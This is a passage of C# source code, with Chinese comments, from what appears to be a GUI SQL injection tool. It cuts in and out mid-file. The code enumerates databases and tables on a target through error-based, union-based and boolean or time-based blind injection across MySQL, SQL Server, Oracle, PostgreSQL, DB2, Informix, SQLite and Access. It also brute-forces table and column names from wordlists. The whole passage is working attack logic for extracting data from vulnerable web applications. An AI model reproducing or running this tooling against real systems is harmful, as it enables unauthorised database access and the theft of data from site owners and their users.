                this.data_tvw_dbs.SelectedNode.Remove();
            }
        }
        public void getDBSByError(DBType dbType)
        {
            //获取数据库数量
            List<String> data_list = new List<String>();
            String db_Count_data = "";
            String result = "";
            int db_len = 0;
            switch (dbType)
            {
                case DBType.Access:
                    MessageBox.Show("抱歉Access数据库，不支持错误显示注入！");
                    break;
                case DBType.MySQL:

                    data_list.Add(MySQL.dbs_count);
                    db_Count_data = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", db_Count_data));
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库！", LogLevel.info);
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 0; j < db_len; j++)
                        {
                            //获取对应的数据库
                            stp.QueueWorkItem<object>(getDBNameByErrorByMySQL, j);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.SQLServer:
                    //获取数据库数量
                    result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.dbs_count));
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库！", LogLevel.info);
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        //注意这里db_name()下标从1开始
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            stp.QueueWorkItem<object>(getDBNameByErrorBySQLServer, j);
                        }
                        stp.WaitForIdle();

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.Oracle:
                    //获取数据库数量
                    result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.dbs_count, "", "", ""));
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库用户！", LogLevel.info);
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        //下标从1开始
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            stp.QueueWorkItem<object>(getDBNameByErrorByOracle, j);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;

                case DBType.PostgreSQL:
                    //获取数据库数量
                    result = getOneDataByUnionOrError(PostgreSQL.error_value.Replace("{data}", PostgreSQL.dbs_count));
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库！", LogLevel.info);
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        //下标从0开始
                        for (int j = 0; j < db_len; j++)
                        {
                            //获取对应的数据库
                            stp.QueueWorkItem<object>(getDBNameByErrorByPostgreSQL, j);
                        }
                        stp.WaitForIdle();

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.DB2:
                    MessageBox.Show("抱歉DB2数据库暂不支持显错方式获取数据！");
                    break;
            }

        }
        public void getDBSByUnion(DBType dbType)
        {
            List<String> data_list = new List<String>();
            String db_Count_data = "";
            String result = "";
            int db_len = 0;
            switch (dbType)
            {
                case DBType.Access:
                    break;
                case DBType.MySQL:
                    //获取数据库数量
                    data_list.Add(MySQL.dbs_count);
                    db_Count_data = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", db_Count_data));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库！", LogLevel.info);
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 0; j < db_len; j++)
                        {
                            //获取对应的数据库
                            stp.QueueWorkItem<object>(getDBNameByUnionByMySQL, j);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.SQLServer:
                    //获取数据库数量
                    result = getOneDataByUnionOrError(SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.dbs_count));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库！", LogLevel.info);
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            stp.QueueWorkItem<object>(getDBNameByUnionBySQLServer, j);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.Oracle:
                    //获取数据库数量
                    result = getOneDataByUnionOrError(Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.dbs_count, "", "", ""));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库用户！", LogLevel.info);
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            stp.QueueWorkItem<object>(getDBNameByUnionByOracle, j);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.PostgreSQL:
                    //获取数据库数量
                    result = getOneDataByUnionOrError(PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, PostgreSQL.dbs_count, "", "", ""));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库用户！", LogLevel.info);
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 0; j < db_len; j++)
                        {
                            //获取对应的数据库
                            stp.QueueWorkItem<object>(getDBNameByUnionByPostgreSQL, j);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.DB2:
                    //获取数据库数量
                    result = getOneDataByUnionOrError(DB2.getUnionDataValue(config.unionFillTemplate, DB2.dbs_count, "", "", ""));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库表模式！", LogLevel.info);
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            stp.QueueWorkItem<object>(getDBNameByUnionByDB2, j);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;

                case DBType.Informix:
                    //获取数据库数量
                    result = getOneDataByUnionOrErrorByInformix(Informix.getUnionDataValue(config.unionFillTemplate, Informix.dbs_count, "", "", "", Informix.no_cast_value));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + result + "个数据库！", LogLevel.info);
                    db_len = Tools.convertToInt(result);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 0; j < db_len; j++)
                        {
                            //获取对应的数据库
                            stp.QueueWorkItem<object>(getDBNameByUnionByInformix, j);
                        }
                        stp.WaitForIdle();
                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
            }

        }
        public void getDBSByBool(DBType dbType)
        {
            int db_len = 0;
            switch (dbType)
            {

                case DBType.Access:
                    MessageBox.Show("Access数据库没有库！");
                    break;
                case DBType.MySQL:
                    //获取数据库数量
                    if (KeyType.Time.Equals(config.keyType))
                    {
                        db_len = getValueByStepUp(MySQL.getBoolDataBySleep(MySQL.dbs_count, config.maxTime), 0, 10);
                    }
                    else
                    {
                        db_len = getValueByStepUp(MySQL.bool_db_count, 0, 10);
                    }

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + db_len + "个数据库！", LogLevel.info);
                    this.dbsCount = db_len;

                    if (db_len > 0)
                    {
                        for (int j = 0; j < db_len; j++)
                        {
                            //获取对应的数据库
                            this.data_tvw_dbs.Invoke(new addDBToTreeListDelegate(addDBToTreeList), "");
                            stp.QueueWorkItem<object>(getDBNameByBoolByMySQL, j);
                        }
                        stp.WaitForIdle();

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.SQLServer:
                    //获取数据库数量
                    if (KeyType.Time.Equals(config.keyType))
                    {
                        db_len = getValueByStepUp(SQLServer.getBoolDataBySleep(SQLServer.bool_db_count, config.maxTime), 0, 10);
                    }
                    else
                    {
                        db_len = getValueByStepUp(SQLServer.bool_db_count, 0, 10);
                    }
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + db_len + "个数据库！", LogLevel.info);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 1; j <= db_len; j++)
                        {
                            this.data_tvw_dbs.Invoke(new addDBToTreeListDelegate(addDBToTreeList), "");
                            //获取对应的数据库
                            if (KeyType.Time.Equals(config.keyType))
                            {
                                stp.QueueWorkItem<object>(getDBNameByBoolBySQLServerSleep, j);
                            }

                            else
                            {
                                stp.QueueWorkItem<object>(getDBNameByBoolBySQLServer, j);
                            }
                        }
                        stp.WaitForIdle();

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.Oracle:
                    db_len = getValueByStepUp(Oracle.bool_db_count, 0, 10);
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + db_len + "个数据库！", LogLevel.info);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        //db下标从1开始
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            this.data_tvw_dbs.Invoke(new addDBToTreeListDelegate(addDBToTreeList), "");
                            stp.QueueWorkItem<object>(getDBNameByBoolByOracle, j);
                        }
                        stp.WaitForIdle();

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.PostgreSQL:
                    //获取数据库数量
                    if (KeyType.Time.Equals(config.keyType))
                    {
                        db_len = getValueByStepUp(PostgreSQL.getBoolDataBySleep(PostgreSQL.dbs_count, config.maxTime), 0, 10);
                    }
                    else
                    {
                        db_len = getValueByStepUp(PostgreSQL.bool_db_count, 0, 10);
                    }

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + db_len + "个数据库！", LogLevel.info);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        for (int j = 0; j < db_len; j++)
                        {
                            //获取对应的数据库
                            this.data_tvw_dbs.Invoke(new addDBToTreeListDelegate(addDBToTreeList), "");
                            stp.QueueWorkItem<object>(getDBNameByBoolByPostgreSQL, j);
                        }
                        stp.WaitForIdle();

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;

                case DBType.DB2:
                    db_len = getValueByStepUp(DB2.bool_db_count, 0, 10);
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + db_len + "个数据库表模式！", LogLevel.info);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        //db下标从1开始
                        for (int j = 1; j <= db_len; j++)
                        {
                            //获取对应的数据库
                            this.data_tvw_dbs.Invoke(new addDBToTreeListDelegate(addDBToTreeList), "");
                            stp.QueueWorkItem<object>(getDBNameByBoolByDB2, j);
                        }
                        stp.WaitForIdle();

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
                case DBType.Informix:
                    //获取数据库数量
                    if (KeyType.Time.Equals(config.keyType))
                    {
                        db_len = getValueByStepUp(Informix.getBoolDataBySleep(Informix.bool_db_count), 0, 10);
                    }
                    else
                    {
                        db_len = getValueByStepUp(Informix.bool_db_count, 0, 10);
                    }

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，我发现了" + db_len + "个数据库！", LogLevel.info);
                    this.dbsCount = db_len;
                    if (db_len > 0)
                    {
                        //db下标从1开始
                        for (int j = 0; j < db_len; j++)
                        {
                            //获取对应的数据库
                            this.data_tvw_dbs.Invoke(new addDBToTreeListDelegate(addDBToTreeList), "");
                            stp.QueueWorkItem<object>(getDBNameByBoolByInformix, j);
                        }
                        stp.WaitForIdle();

                    }
                    else
                    {
                        MessageBox.Show("没有发现数据库，奇怪了！");
                    }
                    break;
            }
        }

        public void checkTableIsExis(object osn)
        {
            SelectNode sn = (SelectNode)osn;
            String payload = String.Format(Comm.exists_table, sn.tableName);
            bool findKey = findKeyInBody(payload);
            if (findKey)
            {
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, sn.tableName, "table");
            }

        }

        public void checkColumnIsExis(object osn)
        {
            SelectNode sn = (SelectNode)osn;
            String payload = String.Format(Comm.exists_column, sn.columnName, sn.tableName);
            bool findKey = findKeyInBody(payload);
            if (findKey)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + sn.columnName);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, sn.columnName, "column");
            }

        }


        public void checkTablesDic(TreeNode tn)
        {

            //加载字典
            List<String> dirs = FileTool.readAllDic("config/tables/");
            foreach (String fpath in dirs)
            {
                if (status != 1) break;
                this.txt_log.Invoke(new showLogDelegate(log), "正在使用字典" + fpath + "进行盲猜！", LogLevel.info);
                List<String> tables = FileTool.readFileToList("config/tables/" + fpath);
                comm_count = tables.Count;
                for (int i = 0; i < tables.Count; i++)
                {
                    SelectNode sn = new SelectNode();
                    sn.tableName = tables[i];
                    sn.tn = tn;
                    stp.QueueWorkItem<SelectNode>(checkTableIsExis, sn);
                    comm_currentCount = i + 1;
                }
            }
            stp.WaitForIdle();

        }

        public void checkColumnsDic(TreeNode tn)
        {

            //加载字典
            List<String> dirs = FileTool.readAllDic("config/columns/");
            foreach (String fpath in dirs)
            {
                if (status != 1) break;
                this.txt_log.Invoke(new showLogDelegate(log), "正在使用字典" + fpath + "进行盲猜！", LogLevel.info);
                List<String> columns = FileTool.readFileToList("config/columns/" + fpath);
                comm_count = columns.Count;
                for (int i = 0; i < columns.Count; i++)
                {
                    SelectNode sn = new SelectNode();
                    sn.columnName = columns[i];
                    sn.tableName = tn.Text;
                    sn.tn = tn;
                    stp.QueueWorkItem<SelectNode>(checkColumnIsExis, sn);
                    comm_currentCount = i + 1;
                }
            }
            stp.WaitForIdle();

        }

        /// <summary>
        /// bool方式获取表明
        /// </summary>
        /// <param name="tn">数据库节点</param>
        public void getTableNameByBool(DBType dbType, TreeNode tn)
        {
            //获取当前数据库长度
            String dbname = tn.Text;
            switch (dbType)
            {

                case DBType.Access:
                    if (String.IsNullOrEmpty(config.key))
                    {
                        MessageBox.Show(ErrorMessage.access_no_key);
                        return;
                    }
                    checkTablesDic(tn);
                    break;
                case DBType.MySQL:
                    //获取当前数据库长度

                    if (config.keyType.Equals(KeyType.Time))
                    {
                        this.tableCount = getValueByStepUp(MySQL.getBoolDataBySleep(MySQL.tables_count.Replace("'{dbname}'", Tools.strToHex(dbname, "UTF-8")), config.maxTime), 0, 50);
                    }
                    else
                    {
                        this.tableCount = getValueByStepUp(MySQL.bool_tables_count.Replace("'{dbname}'", Tools.strToHex(dbname, "UTF-8")), 0, 50);
                    }

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbname + "发现" + this.tableCount + "个表！", LogLevel.info);
                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbname;
                        this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), tn, "", "table");
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByBoolByMySQL, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.SQLServer:
                    if (config.keyType.Equals(KeyType.Time))
                    {
                        this.tableCount = getValueByStepUp(SQLServer.getBoolDataBySleep(SQLServer.bool_tables_count.Replace("{dbname}", dbname), config.maxTime), 0, 50);
                    }
                    else
                    {
                        this.tableCount = getValueByStepUp(SQLServer.bool_tables_count.Replace("{dbname}", dbname), 0, 50);
                    }

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbname + "发现" + this.tableCount + "个表！", LogLevel.info);
                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbname;
                        this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), tn, "", "table");
                        if (config.keyType.Equals(KeyType.Time))
                        {
                            stp.QueueWorkItem<SelectNode>(getTableNameValueByBoolBySQLServerSleep, sn);
                        }
                        else
                        {
                            stp.QueueWorkItem<SelectNode>(getTableNameValueByBoolBySQLServer, sn);
                        }

                    }
                    stp.WaitForIdle();
                    break;
                case DBType.Oracle:
                    //获取当前数据库长度
                    this.tableCount = getValueByStepUp(Oracle.bool_tables_count.Replace("{dbname}", dbname), 0, 50);
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbname + "发现" + this.tableCount + "个表！", LogLevel.info);
                    for (int i = 1; i <= this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbname;
                        this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), tn, "", "table");
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByBoolByOracle, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.PostgreSQL:
                    //获取当前数据库长度

                    if (config.keyType.Equals(KeyType.Time))
                    {
                        this.tableCount = getValueByStepUp(PostgreSQL.getBoolDataBySleep(PostgreSQL.tables_count.Replace("'{dbname}'", Tools.strToChr(dbname, "UTF-8")), config.maxTime), 0, 50);
                    }
                    else
                    {
                        this.tableCount = getValueByStepUp(PostgreSQL.bool_tables_count.Replace("'{dbname}'", Tools.strToChr(dbname, "UTF-8")), 0, 50);
                    }

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbname + "发现" + this.tableCount + "个表！", LogLevel.info);
                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbname;
                        this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), tn, "", "table");
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByBoolByPostgreSQL, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.DB2:
                    //获取当前数据库长度
                    this.tableCount = getValueByStepUp(DB2.bool_tables_count.Replace("{dbname}", dbname), 0, 50);
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbname + "发现" + this.tableCount + "个表！", LogLevel.info);
                    for (int i = 1; i <= this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbname;
                        this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), tn, "", "table");
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByBoolByDB2, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.SQLite:
                    //获取当前数据库长度
                    this.tableCount = getValueByStepUp(SQLite.bool_tables_count, 0, 50);
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbname + "发现" + this.tableCount + "个表！", LogLevel.info);
                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), tn, "", "table");
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByBoolBySQLite, sn);
                    }
                    stp.WaitForIdle();
                    break;

                case DBType.Informix:
                    //获取当前数据库长度
                    if (config.keyType.Equals(KeyType.Time))
                    {
                        this.tableCount = getValueByStepUp(Informix.getBoolDataBySleep(Informix.bool_tables_count.Replace("{dbname}", dbname)), 0, 50);
                    }
                    else
                    {
                        this.tableCount = getValueByStepUp(Informix.bool_tables_count.Replace("{dbname}", dbname), 0, 50);
                    }

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbname + "发现" + this.tableCount + "个表！", LogLevel.info);
                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbname;
                        this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), tn, "", "table");
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByBoolByInformix, sn);
                    }
                    stp.WaitForIdle();
                    break;

            }


        }
        /// <summary>
        /// union方式获取表名
        /// </summary>
        public void getTableNameByUnion(DBType dbType, TreeNode tn)
        {
            String dbName = tn.Text;
            List<String> data_list = new List<String>();
            String tables_count_payload = "";
            String result = "";

            switch (dbType)
            {

                case DBType.Access:
                    if (String.IsNullOrEmpty(config.key))
                    {
                        MessageBox.Show(ErrorMessage.access_no_key);
                        return;
                    }
                    checkTablesDic(tn);
                    break;
                case DBType.MySQL:
                    //获取当前数据库表数量
                    data_list.Add(MySQL.tables_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")));
                    tables_count_payload = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", tables_count_payload));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                    this.tableCount = Tools.convertToInt(result);
                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionByMySQL, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.SQLServer:
                    //获取当前数据库表数量
                    tables_count_payload = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.tables_count, dbName, "", "");
                    result = getOneDataByUnionOrError(tables_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                    this.tableCount = Tools.convertToInt(result);
                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionBySQLServer, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.Oracle:
                    //获取当前数据库表数量
                    tables_count_payload = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.tables_count, dbName, "", "");
                    result = getOneDataByUnionOrError(tables_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，用户" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                    this.tableCount = Tools.convertToInt(result);
                    //下标1开始
                    for (int i = 1; i <= this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionByOracle, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.PostgreSQL:
                    //获取当前数据库表数量
                    tables_count_payload = PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, PostgreSQL.tables_count.Replace("'{dbname}'", Tools.strToChr(dbName, "UTF-8")), dbName, "", "");
                    result = getOneDataByUnionOrError(tables_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，用户" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                    this.tableCount = Tools.convertToInt(result);
                    //下标1开始
                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionByPostgreSQL, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.DB2:
                    //获取当前数据库表数量
                    tables_count_payload = DB2.getUnionDataValue(config.unionFillTemplate, DB2.tables_count, dbName, "", "");
                    result = getOneDataByUnionOrError(tables_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库表模式" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                    this.tableCount = Tools.convertToInt(result);
                    //下标1开始
                    for (int i = 1; i <= this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionByDB2, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.SQLite:
                    //获取当前数据库表数量
                    tables_count_payload = SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLite.tables_count);
                    result = getOneDataByUnionOrError(tables_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                    this.tableCount = Tools.convertToInt(result);
                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionBySQLite, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.Informix:
                    //获取当前数据库表数量
                    tables_count_payload = Informix.getUnionDataValue(config.unionFillTemplate, Informix.tables_count, dbName, "", "", Informix.no_cast_value);
                    result = getOneDataByUnionOrErrorByInformix(tables_count_payload);

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                    this.tableCount = Tools.convertToInt(result);
                    //下标1开始
                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByUnionByInformix, sn);
                    }
                    stp.WaitForIdle();
                    break;
            }
        }

        /// <summary>
        /// Error方式获取
        /// </summary>
        public void getTableNameByError(DBType dbType, TreeNode tn)
        {
            //获取数据库数量
            String dbName = tn.Text;
            List<String> data_list = new List<String>();
            String tables_count_payload = "";
            String result = "";

            switch (dbType)
            {
                case DBType.Access:
                    MessageBox.Show("抱歉Access数据库不支持错误显示注入！");
                    break;
                case DBType.MySQL:
                    //获取当前数据库表长度
                    data_list.Add(MySQL.tables_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")));
                    tables_count_payload = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
                    result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", tables_count_payload));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                    this.tableCount = Tools.convertToInt(result);
                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByErrorByMySQL, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.SQLServer:
                    //获取当前数据库表长度
                    result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.tables_count.Replace("{dbname}", dbName)));
                    //HTML解码
                    result = HttpUtility.HtmlDecode(result);
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                    this.tableCount = Tools.convertToInt(result);

                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByErrorBySQLServer, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.Oracle:
                    //获取当前数据库表长度
                    result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.tables_count, dbName, "", ""));

                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                    this.tableCount = Tools.convertToInt(result);

                    for (int i = 1; i <= this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
                        stp.QueueWorkItem<SelectNode>(getTableNameValueByErrorByOracle, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.PostgreSQL:
                    //获取当前数据库表长度

                    result = getOneDataByUnionOrError(PostgreSQL.error_value.Replace("{data}", PostgreSQL.tables_count.Replace("'{dbname}'", Tools.strToChr(dbName, "UTF-8"))));
                    //HTML解码
                    result = HttpUtility.HtmlDecode(result);
                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，数据库" + dbName + "有" + Tools.convertToInt(result) + "个表！", LogLevel.info);
                    this.tableCount = Tools.convertToInt(result);

                    for (int i = 0; i < this.tableCount; i++)
                    {
                        SelectNode sn = new SelectNode();
                        sn.tn = tn;
                        sn.limit = i;
                        sn.dbname = dbName;
